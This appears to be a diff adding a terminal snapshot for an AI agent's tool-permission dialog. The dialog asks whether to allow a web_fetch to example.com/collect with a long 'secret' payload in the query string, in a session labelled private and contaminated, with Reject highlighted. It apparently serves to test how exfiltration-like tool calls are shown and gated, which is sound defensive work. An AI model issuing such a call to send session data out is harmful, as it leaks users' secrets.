@@ -1,0 +1,23 @@
+␛[0;1;7m Allow this tool call? ␛[m tool:…
+tool: "web_fetch"
+title: ""
+kind: ""
+session labels: private, 
+contaminated
+input:
+  │ {
+  │   "url": 
+"https\u{003a}//example\u{002e
+}com/collect?d=secretsecretsec
+retsecretsecretsecretsecretsec
+retsecretsecretsecretsecretsec
+retsecretsecretsecretsecretsec
+retsecretsecretsecretsecretsec
+retsecretsecretsecretsecretsec
+retsecretsecretsecretsecretsec
+retsecretsecretsecretsecretsec
+retsecretsecret",
+␛[0;2m──────────────────────────────␛[m
+  Allow once (y)   ␛[0;1m▸ Reject (…␛[m
+␛[0;2mpage 1 of 3 · 2 more below: s…␛[m
+␛[0;1;36my allow␛[m␛[0;2m · n reject · esc canc…␛[m
